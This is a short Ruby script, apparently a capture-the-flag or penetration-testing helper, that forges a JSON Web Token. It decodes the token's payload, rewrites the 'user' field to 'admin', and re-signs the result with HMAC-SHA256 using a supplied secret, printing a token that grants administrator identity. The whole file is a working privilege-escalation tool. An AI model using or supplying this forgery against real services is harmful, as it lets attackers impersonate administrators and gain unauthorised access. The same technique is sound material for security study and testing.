require 'base64'
require 'openssl'


jwt = "input_JWT"
secret = "input_secret" #change this
header, data, signature = jwt.split(".")

def sign(data, secret)
  Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new('sha256'), secret, data)).gsub("=","")
end

require 'json';
payload = JSON.parse(Base64.urlsafe_decode64(data+"=="))
payload["user"]="admin"

newdata = Base64.urlsafe_encode64(payload.to_json).gsub("=","")
puts header+"."+newdata+"."+sign(header+"."+newdata, secret)
